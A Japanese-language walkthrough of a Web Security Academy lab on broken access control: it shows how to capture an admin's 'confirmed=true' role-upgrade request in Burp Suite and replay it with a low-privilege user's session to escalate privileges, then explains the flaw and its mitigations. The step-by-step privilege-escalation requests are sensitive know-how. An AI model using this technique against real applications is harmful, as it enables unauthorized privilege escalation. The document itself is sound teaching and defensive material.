
## 🎯 解答の完全手順(超詳細版)

### **Phase 1: 管理者として正規の流れを観察する**

#### **Step 1: Burp Suiteの設定**
```
Burp Suite起動
→ Proxy → Intercept is ON にする ← 今回は ON!
```

#### **Step 2: 管理者でログイン**
```
ブラウザで:
Username: administrator
Password: admin
→ ログイン
```

#### **Step 3: Admin Panelに移動**
```
ログイン後、画面上部の "Admin panel" をクリック
```

#### **Step 4: Carlosをアップグレード開始**
```
Admin panelで:
User: carlos の横にある [Upgrade user] ボタンをクリック
```

**ここで重要!Burpがリクエストをキャッチする:**

#### **Step 5: 最初のPOSTリクエストを確認**
```
Burpに表示されるリクエスト:
POST /admin-roles HTTP/2
...
username=carlos&action=upgrade
```

**このリクエストには `confirmed=true` がない!**

```
このリクエストを右クリック → "Send to Repeater"
→ Forwardボタンをクリック(リクエストを通す)
```

#### **Step 6: 確認画面が表示される**
```
ブラウザに確認画面が出る:
"Are you sure?"
[Yes] [No]

"Yes" をクリック ← まだクリックしないで待つ!
```

#### **Step 7: 2番目のPOSTリクエストをキャッチ**
```
"Yes" をクリックすると、Burpが2番目のリクエストをキャッチ:

POST /admin-roles HTTP/2
...
username=carlos&action=upgrade&confirmed=true ← confirmed=trueが追加されてる!
```

**これが攻撃に使うリクエスト!**

```
このリクエストも右クリック → "Send to Repeater"
→ Forwardボタンをクリック
```

#### **Step 8: 管理者からログアウト**
```
ブラウザで "Log out" をクリック
管理者セッションは終了
```

---

### **Phase 2: Wienerのセッションを取得**

#### **Step 9: Wienerでログイン**
```
Burp Proxy → Intercept is ON のまま

ブラウザで:
Username: wiener
Password: peter
→ ログイン
```

#### **Step 10: Wienerのセッションを取得**
```
ログイン後、"My account" ページに移動しようとする
→ Burpがリクエストをキャッチ:

GET /my-account HTTP/2
...
Cookie: session=XXXXXXXXXX ← これがWienerのセッション!
```

**この `session=XXXXXXXXXX` の値をコピー!**

```
→ Forwardボタンをクリック(リクエストを通す)
→ Intercept is OFF にする(もう必要ない)
```

---

### **Phase 3: 攻撃実行**

#### **Step 11: Repeaterに移動**
```
Burp → Repeater タブ
→ **2番目のリクエスト**(confirmed=trueがあるやつ)を選ぶ
```

#### **Step 12: リクエストを編集**

**編集前:**
```http
POST /admin-roles HTTP/2
Host: xxxx.web-security-academy.net
Cookie: session=管理者のセッション
Content-Length: XX

username=carlos&action=upgrade&confirmed=true
```

**編集後:**
```http
POST /admin-roles HTTP/2
Host: xxxx.web-security-academy.net
Cookie: session=WienerのセッションXXXXXXXX ← 変更!
Content-Length: XX

username=wiener&action=upgrade&confirmed=true ← carlosをwienerに変更!
```

#### **Step 13: 攻撃実行!**
```
Sendボタンをクリック!
```

#### **Step 14: レスポンス確認**
```
Response:
HTTP/2 302 Found
または
HTTP/2 200 OK

→ 成功!
```

#### **Step 15: 確認**
```
ブラウザでWienerのページをリフレッシュ
→ Admin panelが見えるようになってる!
→ ラボが "Solved" になる!
```

---

## 🔑 めっちゃ重要なポイント!

### **2つのPOSTリクエストがある:**

#### **1番目(最初のアップグレードリクエスト):**
```
POST /admin-roles
username=carlos&action=upgrade
```
→ これは使わない!

#### **2番目(確認リクエスト) ← これを使う!**
```
POST /admin-roles  
username=carlos&action=upgrade&confirmed=true
```
→ **`confirmed=true` が付いてるやつ!**

---

## 📋 チェックリスト

やる前に確認:
- [ ] Burp Proxy → **Intercept is ON**
- [ ] 管理者でログイン
- [ ] Carlosの[Upgrade user]クリック
- [ ] **1番目のPOSTリクエスト**をRepeaterに送る
- [ ] [Yes]クリック
- [ ] **2番目のPOSTリクエスト**(confirmed=true)をRepeaterに送る ← これ重要!
- [ ] 管理者からログアウト
- [ ] Wienerでログイン
- [ ] WienerのセッションCookieをコピー
- [ ] Repeaterで**2番目のリクエスト**を編集
- [ ] username=wiener, Cookie=Wienerのセッション
- [ ] Send!

---


# 🛡️ **脆弱性の種類（一般論）**
### **不適切なアクセス制御（Broken Access Control）**
特に、  
- **多段階操作の2段目だけが保護されていない**  
- **確認用リクエストに対して権限チェックが欠落している**  
という典型的なパターン。

---

# 🔍 **どう気づく？（一般論）**
- 管理者UIで操作すると **2つのリクエストが発生**する  
  ① 操作開始（権限チェックあり）  
  ② 確認（権限チェックなし）  
- 2つ目のリクエストを観察すると、  
  **「権限を示す情報がCookie以外に存在しない」**  
  → つまり **セッションさえ差し替えれば通る構造** と気づく。

---

# 🎯 **どう攻撃される？（一般論）**
攻撃者は以下のような流れで悪用できる：

1. 管理者が正規操作を行った際の **確認リクエスト（confirmed=true）** を観察  
2. そのリクエストをコピー  
3. Cookie を攻撃者のセッションに差し替える  
4. `username=` を攻撃者自身に変更  
5. サーバーが **権限チェックを行わないため**、攻撃者が昇格してしまう

つまり本質は：

> **「確認ステップのリクエストに対して権限チェックが無い」**  
> → **攻撃者が正規ユーザーのセッションで再送すると通ってしまう**

---

# 🛠️ **どう対策する？（一般論）**
### **1. すべてのリクエストで権限チェックを行う**
- 多段階操作の**各ステップ**で必ず認可処理を行う  
- 「最初のステップだけチェック」はNG

### **2. クライアント側のパラメータを信用しない**
- `confirmed=true` のような値を信頼しない  
- サーバー側で状態管理を行う

### **3. セッション固定・差し替えを防ぐ**
- セッション管理の強化  
- CSRFトークンの導入  
- 状態遷移の整合性チェック

---

# ⚡ まとめ

```
今回の問題は、多段階操作の2段目に権限チェックが無い
「Broken Access Control」の典型例です。

管理者が操作すると2つのPOSTが送られますが、
確認用の2つ目のリクエストには認可処理が無く、
攻撃者が自分のセッションに差し替えて再送すると
権限昇格が成立してしまいます。

対策としては、全てのリクエストで認可チェックを行うこと、
クライアント側パラメータを信用しないこと、
状態遷移をサーバー側で厳密に管理することが重要です。
```

---




# 🧩 **なぜ 2番目のリクエスト（confirmed=true）が必須なのか？**

## 🎯 **結論（最重要）**
**2番目のリクエストだけが “実行処理” を行うから。  
1番目は “確認画面を出すだけ” で、昇格処理は一切しない。**

---

# 🏗️ **脆弱性の構造（Multi-step process の典型的な欠陥）**

## **Step 1: Upgrade user ボタンを押す**
```http
POST /admin-roles
username=carlos&action=upgrade
```

### ✔️ ここは安全  
- 管理者だけが押せる  
- **アクセス制御あり**  
- 役割：**確認画面を表示するだけ**

---

## **Step 2: Yes を押す（確認ステップ）**
```http
POST /admin-roles
username=carlos&action=upgrade&confirmed=true
```

### ❌ ここが脆弱  
- **アクセス制御なし**  
- 役割：**実際に昇格処理を実行する**

---

# 🔥 **なぜ1番目のリクエストでは攻撃できない？**

### 1番目のリクエストを送ると…
- サーバーは「確認画面へ進め」と返すだけ  
- **昇格処理はまだ実行されない**  
- 攻撃者が送っても何も起きない

---

# 🔥 **なぜ2番目のリクエストなら攻撃できる？**

### 2番目のリクエストは…
- `confirmed=true` が付いている  
- **「Yes を押した」という証拠として扱われる**  
- サーバーは **即座に昇格処理を実行する**

### そして致命的なのは…
- **この2番目のリクエストにアクセス制御がない**  
- つまり攻撃者が自分のセッションで送っても通る

---

# 🎯 **本質を一言で言うと**

> **“最後のステップだけ認可チェックが抜けていたため、  
> 攻撃者が確認ステップを偽装して直接実行できた”**

これが Multi-step process の Broken Access Control。

---

# 🛡️ **対策（一般論）**

## ✔️ 1. すべてのステップでアクセス制御を行う  
- 特に **最終ステップ** は絶対にチェックする

## ✔️ 2. クライアントのパラメータを信用しない  
- `confirmed=true` のような値は信用しない  
- サーバー側で状態管理（セッション内フラグなど）を行う

## ✔️ 3. 状態遷移の整合性チェック  
- 「Step1 を踏んだユーザーだけが Step2 を実行できる」  
- これをサーバー側で保証する

---


